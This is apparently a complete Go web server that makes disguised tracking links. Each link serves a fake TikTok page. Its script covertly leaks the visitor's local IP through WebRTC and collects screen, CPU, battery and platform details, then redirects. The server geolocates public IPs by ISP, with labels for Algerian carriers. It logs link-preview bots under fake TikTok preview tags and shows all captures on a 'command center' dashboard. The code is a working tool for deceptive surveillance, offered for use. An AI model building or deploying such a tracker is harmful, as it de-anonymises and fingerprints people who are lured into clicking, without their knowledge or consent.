package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

var db *sql.DB

type Capture struct {
	ID         int
	Code       string
	PublicIP   string
	LocalIP    string
	Port       string
	Location   string
	DeviceInfo string
	CreatedAt  string
}

type PageData struct {
	GeneratedLink string
	Captures      []Capture
}

func initDB() {
	var err error
	db, err = sql.Open("sqlite", "./long_term_tracker.db")
	if err != nil {
		panic(err)
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(25)
	db.SetConnMaxLifetime(5 * time.Minute)

	createTablesSQL := `
	CREATE TABLE IF NOT EXISTS links (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT UNIQUE,
		target_url TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE TABLE IF NOT EXISTS captures (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT,
		public_ip TEXT,
		local_ip TEXT,
		port TEXT,
		location TEXT,
		device_info TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE INDEX IF NOT EXISTS idx_captures_code ON captures(code);
	CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at);
	`
	_, err = db.Exec(createTablesSQL)
	if err != nil {
		panic(err)
	}
}

func getRealIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ips := strings.Split(forwarded, ",")
		return strings.TrimSpace(ips[0])
	}
	ip := r.RemoteAddr
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func getISPAndLocation(ip string, ua string) string {
	if ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") {
		return "Local Network / Internal"
	}

	lowerUA := strings.ToLower(ua)
	if strings.Contains(lowerUA, "telegram") {
		return "Telegram Preview Server [Bot]"
	}
	if strings.Contains(lowerUA, "whatsapp") {
		return "WhatsApp Preview Server [Bot]"
	}
	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
		return "Meta / Messenger Server [Bot]"
	}

	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
	if err != nil {
		return "Algeria (Network Trace)"
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if status, ok := result["status"].(string); ok && status == "success" {
		city, _ := result["city"].(string)
		country, _ := result["country"].(string)
		if country == "" {
			country = "Algeria"
		}
		isp, _ := result["isp"].(string)
		if isp == "" {
			isp, _ = result["org"].(string)
		}

		lowerISP := strings.ToLower(isp)
		networkType := fmt.Sprintf(" [ISP: %s]", isp)
		if strings.Contains(lowerISP, "mobilis") {
			networkType = " [⚡ Mobilis Algeria]"
		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
			networkType = " [🔥 Djezzy Algeria]"
		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
			networkType = " [⭐ Ooredoo Algeria]"
		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
			networkType = " [🌐 Algérie Télécom / ADSL]"
		}

		locStr := country
		if city != "" {
			locStr = city + ", " + country
		}
		return locStr + networkType
	}
	return "Algeria (Network Trace)"
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("r")

	if code != "" {
		var targetURL string
		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
		if err != nil {
			http.Error(w, "Link not found or expired", http.StatusNotFound)
			return
		}

		ua := r.UserAgent()
		isBot := strings.Contains(strings.ToLower(ua), "bot") ||
			strings.Contains(strings.ToLower(ua), "whatsapp") ||
			strings.Contains(strings.ToLower(ua), "telegram") ||
			strings.Contains(strings.ToLower(ua), "facebookexternalhit")

		if isBot {
			publicIP := getRealIP(r)
			location := getISPAndLocation(publicIP, ua)
			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
				code, publicIP, "Zero-Click Bot", "N/A", location, "🤖 [Preview Bot] UA: "+ua[:40])

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="TikTok Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"><title>TikTok</title></head><body></body></html>`)
			return
		}

		if r.Method == http.MethodPost {
			r.ParseForm()
			publicIP := getRealIP(r)
			localIP := r.FormValue("lip")
			if localIP == "" {
				localIP = "Unknown"
			}
			port := r.RemoteAddr
			location := getISPAndLocation(publicIP, ua)

			deviceInfo := fmt.Sprintf("⚡ Platform: %s | Screen: %s | CPU: %s | Battery: %s",
				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"))

			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
				code, publicIP, localIP, port, location, deviceInfo)

			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
			return
		}

		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TikTok Video</title>
    <script>
        function getLocalIP(callback) {
            let found = false;
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (ipMatch) {
                    let ip = ipMatch[1];
                    if ((ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) && !found) {
                        found = true; callback(ip); pc.onicecandidate = null;
                    }
                }
            };
            setTimeout(() => { if (!found) callback("Direct / Mobile Data"); }, 60);
        }

        async function run() {
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cores = navigator.hardwareConcurrency || "Unknown";
            let platform = navigator.platform || "Unknown";
            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    let b = await navigator.getBattery();
                    batteryInfo = Math.round(b.level * 100) + "%%%%";
                }
            } catch(e){}

            getLocalIP(function(lip) {
                let params = new URLSearchParams();
                params.append('lip', lip);
                params.append('screen', screenRes);
                params.append('hardware', cores + " Cores");
                params.append('battery', batteryInfo);
                params.append('platform', platform);

                navigator.sendBeacon ? navigator.sendBeacon(window.location.href, params) : fetch(window.location.href, {method: 'POST', body: params, keepalive:true});

                setTimeout(() => {
                    window.location.replace("%s");
                }, 80);
            });
        }
        window.addEventListener('DOMContentLoaded', run);
    </script>
</head>
<body style="background:#000;"></body>
</html>`, targetURL)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(htmlContent))
		return
	}

	var generatedLink string
	if r.Method == http.MethodPost {
		r.ParseForm()
		targetURL := r.FormValue("target_url")
		if targetURL != "" {
			if !strings.HasPrefix(targetURL, "http") {
				targetURL = "https://" + targetURL
			}
			codeGen := fmt.Sprintf("%d", time.Now().UnixNano())[8:]
			db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)

			scheme := "https"
			if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
				scheme = "http"
			}
			generatedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
		}
	}

	rows, _ := db.Query("SELECT id, code, public_ip, local_ip, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
	defer rows.Close()

	var captures []Capture
	for rows.Next() {
		var c Capture
		rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt)
		captures = append(captures, c)
	}

	data := PageData{
		GeneratedLink: generatedLink,
		Captures:      captures,
	}

	tmpl := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Go Intelligence Command Center</title>
    <style>
        :root {
            --bg-grad-1: #0f172a;
            --bg-grad-2: #1e1b4b;
            --card-bg: rgba(19, 27, 46, 0.75);
            --border-glow: rgba(99, 102, 241, 0.3);
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --success: #10b981;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body {
            background: linear-gradient(135deg, var(--bg-grad-1), var(--bg-grad-2));
            color: var(--text-main);
            min-height: 100vh;
            padding: 40px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            width: 100%%;
            max-width: 1100px;
            display: flex;
            flex-direction: column;
            gap: 25px;
        }
        header {
            text-align: center;
            margin-bottom: 10px;
        }
        header h1 {
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(90deg, #818cf8, #c084fc, #38bdf8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 0.5px;
        }
        header p {
            color: var(--text-muted);
            font-size: 13px;
            margin-top: 5px;
        }
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-glow);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            transition: transform 0.3s ease;
        }
        .card:hover {
            border-color: rgba(99, 102, 241, 0.6);
        }
        h2 {
            font-size: 15px;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            color: #a5b4fc;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .form-group {
            display: flex;
            gap: 12px;
        }
        input[type="text"] {
            flex: 1;
            background: rgba(2, 6, 23, 0.8);
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 14px 18px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s;
        }
        input[type="text"]:focus {
            border-color: var(--accent);
            box-shadow: 0 0 15px rgba(99, 102, 241, 0.3);
        }
        button {
            background: linear-gradient(135deg, var(--accent), #4f46e5);
            color: #fff;
            border: none;
            padding: 0 28px;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.2s;
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6);
        }
        .result-box {
            background: rgba(2, 6, 23, 0.9);
            border: 1px solid var(--success);
            padding: 16px;
            border-radius: 10px;
            margin-top: 18px;
            animation: fadeIn 0.4s ease-in-out;
        }
        .result-box strong {
            color: var(--success);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            display: block;
            margin-bottom: 6px;
        }
        .result-box a {
            color: #38bdf8;
            text-decoration: none;
            font-family: monospace;
            font-size: 14px;
            word-break: break-all;
        }
        .result-box a:hover {
            text-decoration: underline;
        }
        .table-responsive {
            overflow-x: auto;
            margin-top: 10px;
        }
        table {
            width: 100%%;
            border-collapse: collapse;
            text-align: left;
            font-size: 13px;
        }
        th, td {
            padding: 12px 14px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        th {
            background: rgba(15, 23, 42, 0.7);
            color: var(--text-muted);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 11px;
            letter-spacing: 0.05em;
        }
        tr:hover td {
            background: rgba(255, 255, 255, 0.02);
        }
        .badge-code { color: #818cf8; font-family: monospace; font-weight: bold; }
        .badge-ip { color: #38bdf8; font-family: monospace; }
        .badge-local { color: #fbbf24; font-family: monospace; }
        .badge-isp { color: #34d399; font-weight: 600; }
        .badge-dev { color: #fb7185; }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(6px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>⚡ GO INTELLIGENCE COMMAND CENTER</h1>
            <p>High-Performance Real-Time Tracking & Data Persistence Engine</p>
        </header>

        <div class="card">
            <h2>🔗 Generate Tracking Link</h2>
            <form method="POST" class="form-group">
                <input type="text" name="target_url" placeholder="Paste target URL (e.g., https://www.tiktok.com/...)" required autocomplete="off">
                <button type="submit">Create Link</button>
            </form>
            {{if .GeneratedLink}}
            <div class="result-box">
                <strong>✨ Active Generated Link:</strong>
                <a href="{{.GeneratedLink}}" target="_blank">{{.GeneratedLink}}</a>
            </div>
            {{end}}
        </div>

        <div class="card">
            <h2>📊 Captured Intelligence Logs (Long-Term Storage)</h2>
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Code</th>
                            <th>Public IP</th>
                            <th>Local IP</th>
                            <th>Network / ISP</th>
                            <th>Hardware & Specs</th>
                            <th>Time</th>
                        </tr>
                    </thead>
                    <tbody>
                        {{range .Captures}}
                        <tr>
                            <td>{{.ID}}</td>
                            <td><span class="badge-code">{{.Code}}</span></td>
                            <td><span class="badge-ip">{{.PublicIP}}</span></td>
                            <td><span class="badge-local">{{.LocalIP}}</span></td>
                            <td><span class="badge-isp">{{.Location}}</span></td>
                            <td><span class="badge-dev">{{.DeviceInfo}}</span></td>
                            <td style="color: var(--text-muted);">{{.CreatedAt}}</td>
                        </tr>
                        {{end}}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>`

	t, _ := template.New("index").Parse(tmpl)
	t.Execute(w, data)
}

func main() {
	initDB()
	http.HandleFunc("/", mainHandler)
	fmt.Println("[*] High-Performance Go Server running on port 8080...")
	http.ListenAndServe(":8080", nil)
}
